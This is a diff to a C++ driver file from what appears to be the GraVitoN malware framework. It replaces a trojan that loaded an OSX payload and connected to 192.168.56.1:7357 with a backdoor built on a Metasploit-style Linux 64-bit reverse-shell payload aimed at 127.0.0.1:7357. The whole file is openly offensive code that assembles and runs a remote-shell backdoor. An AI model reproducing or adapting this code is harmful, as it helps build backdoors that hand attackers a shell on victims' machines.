@@ -1,3 +1,5 @@
+// ----> DO NOT FORGET TO DISABLE OPTIMIZATION FLAG
+
 /**
  * @file
  * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
@@ -28,39 +30,35 @@
 
 
 /// Activate/Deactivate GraVitoN logger
-// #define GVN_ACTIVATE_LOGGER
+#define GVN_ACTIVATE_LOGGER
 /// Print logs into a file
 //#define GVN_LOG_INTO_FILE
 /// Path to Log File
 //#define GVN_LOG_FILE "./graviton_logs.txt"
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#include "../../../graviton.hpp"
-#include "../../../gvn_payload/osx/gvn_payload_osx32b.hpp"
-#include "../../../gvn_ai/gvn_ai_trojan_sample.hpp"
+#include <graviton.hpp>
+// #include <payload/linux/msf_shell_bind_64.hpp>
+#include <payload/linux/msf_shell_reverse_64.hpp>
+#include <ai/backdoor_sample.hpp>
 #include <iostream>
 using namespace std;
-
-class My_Trojan_AI : public AI_Trojan_Sample
-{
-protected:
-	virtual bool initializeInternalComponents()
-	{
-		payload = new Payload_Osx32b();
-		payload->initialize(options);
-	}
-};
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 int main()
 {
-	GraVitoN::Logger::logItLn ( "main -> AI" );
-
-	My_Trojan_AI ai;
-	ai.initialize("PORT=7357 HOST=192.168.56.1");
-	ai.run();
+    GraVitoN::Core::Logger::logItLn ( "main -> Started" );
 	
-	GraVitoN::Logger::logItLn ( "main -> done" );
+    // GraVitoN::Payload::Linux_MSF_Shell_Bind_64 msfpay;
+    // msfpay.initialize(7357);
+    GraVitoN::Payload::Linux_MSF_Shell_Reverse_64 msfpay;
+    msfpay.initialize("127.0.0.1", 7357);
+
+    GraVitoN::AI::Backdoor_Sample backy(msfpay);
+
+    backy.run();
+	
+    GraVitoN::Core::Logger::logItLn ( "main -> done" );
 	
     return 0;
 }
